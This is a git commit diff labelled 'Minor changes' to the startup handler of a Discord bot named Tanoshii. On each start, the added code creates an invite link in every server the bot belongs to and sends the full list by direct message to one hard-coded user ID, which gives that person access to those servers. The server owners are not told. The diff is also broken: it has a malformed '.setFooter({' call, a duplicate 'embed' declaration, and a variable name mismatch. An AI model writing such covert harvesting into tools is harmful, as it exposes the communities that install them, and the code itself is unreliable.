be697a540b572d880c20a9bd52e358778227c84e
OfficialCRUGG <mrcreeper2011@web.de>
2019-03-07 19:44:45 +0100

    Minor changes

--- events/ready.js
+++ events/ready.js
@@ -10,8 +10,25 @@ module.exports = async (client) => {
     client.user.setActivity(status, {type: "WATCHING"});
   }, 5000);
 
+  let embed = new Discord.RichEmbed()
+  .setTitle("Bot started")
+  .setColor(config.mainColor)
+  .setDescription("Tanoshii has started.")
+  .setFooter({config.name);
+  client.users.get("228965621478588416").send(embed);
+
+  let guilds = "";
+
   client.guilds.forEach(async (guild) => {
     let invite = await guild.channels.filter((channels) => channels.type === "text").first().createInvite(false, 600, 1, false);
+    guildsList += guild.name + ": https://discord.gg/" + invite.code + "\n";
     console.log("[INFO] " + guild.name + ": https://discord.gg/" + invite.code);
   });
+
+  let embed = new Discord.RichEmbed()
+  .setTitle("Current Guilds")
+  .setColor(config.mainColor)
+  .setDescription("```" + guildsList + "```")
+  .setFooter(config.name);
+  return client.users.get("228965621478588416").send(embed);
 };
